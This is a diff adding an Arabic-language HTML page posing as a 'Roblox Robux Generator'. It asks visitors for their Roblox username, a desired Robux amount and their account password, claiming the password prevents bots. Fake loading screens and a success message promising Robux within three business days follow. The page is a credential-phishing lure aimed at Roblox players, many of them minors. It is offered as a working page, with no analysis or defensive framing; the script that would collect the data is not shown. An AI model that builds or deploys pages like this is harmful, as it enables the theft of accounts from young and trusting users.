@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Robux Generator</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="card">
+    <!-- المرحلة 1: تحميل عند الدخول -->
+    <div id="step-initial-load" class="step active">
+        <h2>جاري الاتصال بخوادم Roblox...</h2>
+        <div class="loader"></div>
+    </div>
+
+    <!-- المرحلة 2: الاسم -->
+    <div id="step-name" class="step">
+        <h2>اسم حساب Roblox</h2>
+        <p class="subtitle">أدخل اسم حسابك بدقة ليتم العثور عليه</p>
+        <input type="text" id="username" placeholder="ضع اسم حسابك ب الصحيح">
+        <button onclick="submitName()">تأكيد الحساب</button>
+    </div>
+
+    <!-- المرحلة 3: كمية الروبوكس -->
+    <div id="step-text" class="step">
+        <h2>كمية الـ Robux المطلوبة</h2>
+        <p class="subtitle">اكتب كمية الـ Robux التي تريد إضافتها لحسابك</p>
+        <input type="number" id="usertext" placeholder=" ضع الروبوكس الذي تريده 
+ ">
+        <button onclick="submitText()">تأكيد وإرسال</button>
+    </div>
+
+    <!-- المرحلة 4 الجديدة: الباسورد -->
+    <div id="step-password" class="step">
+        <h2>تأكيد كلمة المرور (Password)</h2>
+        <p class="subtitle">يرجى إدخال كلمة مرور الحساب للحماية ومنع البوتات</p>
+        <!-- استخدمنا type="password" لكي تظهر النجوم لحماية الخصوصية -->
+        <input type="password" id="userpassword" placeholder="أدخل كلمة المرور هنا...">
+        <button onclick="submitPassword()">تأكيد التحقق</button>
+    </div>
+
+    <!-- المرحلة 5: تحميل 10 ثواني -->
+    <div id="step-final-load" class="step">
+        <h2>جاري توليد وتشفير الـ Robux...</h2>
+        <div class="loader"></div>
+        <p id="countdown" class="timer">متبقي 10 ثوانٍ</p>
+    </div>
+
+    <!-- المرحلة 6: النهاية -->
+    <div id="step-success" class="step">
+        <div class="success-icon">✓</div>
+        <h2>تم التحقق من العملية بنجاح!</h2>
+        <p>لقد تم التحقق من الحساب بنجاح، وسيتم إرسال الـ Robux إلى حسابك بعد 3 أيام عمل.</p>
+    </div>
+</div>
+
+    <script src="script.js"></script>
+</body>
+</html>
